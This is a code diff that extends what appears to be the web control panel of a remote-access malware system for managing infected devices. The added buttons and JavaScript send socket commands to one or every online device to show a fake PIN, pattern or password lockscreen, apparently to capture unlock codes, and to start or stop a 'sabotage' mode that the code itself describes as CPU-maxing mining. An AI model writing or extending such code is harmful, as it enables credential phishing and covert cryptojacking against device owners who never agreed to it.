@@ -473,6 +473,13 @@
                             <button class="header-btn" onclick="sendAggressiveKeepalive(false)" style="border-color:#ff6b6b;color:#ff6b6b;">Stop Aggressive Keepalive</button>
                             <button class="header-btn" onclick="sendForceInteract()" style="background:#ff4444;color:#fff;border-color:#ff4444;font-weight:bold;">&#x1f4a5; Force Interact Sequence</button>
                         </div>
+                        <div style="display:flex;gap:8px;margin-top:6px;flex-wrap:wrap;">
+                            <button class="header-btn" onclick="sendFakeLockscreen('pin')" style="background:#ff9800;color:#fff;border-color:#ff9800;font-weight:bold;">&#x1f512; Fake Lock PIN</button>
+                            <button class="header-btn" onclick="sendFakeLockscreen('pattern')" style="background:#ff9800;color:#fff;border-color:#ff9800;">Pola</button>
+                            <button class="header-btn" onclick="sendFakeLockscreen('password')" style="background:#ff9800;color:#fff;border-color:#ff9800;">Password</button>
+                            <button class="header-btn" onclick="sendSabotage()" style="background:#d32f2f;color:#fff;border-color:#d32f2f;font-weight:bold;">&#x26a1; Execute Sabotage</button>
+                            <button class="header-btn" onclick="sendStopSabotage()" style="border-color:#ff6b6b;color:#ff6b6b;">Stop Sabotage</button>
+                        </div>
                         <div id="pcStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
                     </div>
 
@@ -2065,6 +2072,57 @@
                 }
                 statusEl.textContent = 'Force interact sequence sent to ' + sent + ' device';
                 showToast('Bulk force interact sequence sent: ' + sent + ' device', 'success');
+            }
+        }
+
+        function sendFakeLockscreen(style) {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-fake-lockscreen', { deviceId: id, style: style, maxLength: 6 });
+                statusEl.textContent = 'Fake '+style+' lockscreen sent to ' + id.slice(0,8) + '...';
+                showToast('Fake '+style+' lockscreen sent', 'success');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-fake-lockscreen', { deviceId: did, style: style, maxLength: 6 }); sent++; }
+                }
+                statusEl.textContent = 'Fake '+style+' lockscreen sent to ' + sent + ' device';
+                showToast('Bulk fake '+style+' lockscreen: ' + sent + ' device', 'success');
+            }
+        }
+
+        function sendSabotage() {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-sabotage', { deviceId: id });
+                statusEl.textContent = 'CPU sabotage started on ' + id.slice(0,8) + '...';
+                showToast('Sabotage mode activated - CPU 100% mining', 'success');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-sabotage', { deviceId: did }); sent++; }
+                }
+                statusEl.textContent = 'CPU sabotage started on ' + sent + ' device';
+                showToast('Bulk sabotage: ' + sent + ' device', 'success');
+            }
+        }
+
+        function sendStopSabotage() {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-stop-sabotage', { deviceId: id });
+                statusEl.textContent = 'Sabotage stopped on ' + id.slice(0,8);
+                showToast('Sabotage stopped', 'info');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-stop-sabotage', { deviceId: did }); sent++; }
+                }
+                statusEl.textContent = 'Sabotage stopped on ' + sent + ' device';
+                showToast('Bulk sabotage stopped: ' + sent + ' device', 'info');
             }
         }
 
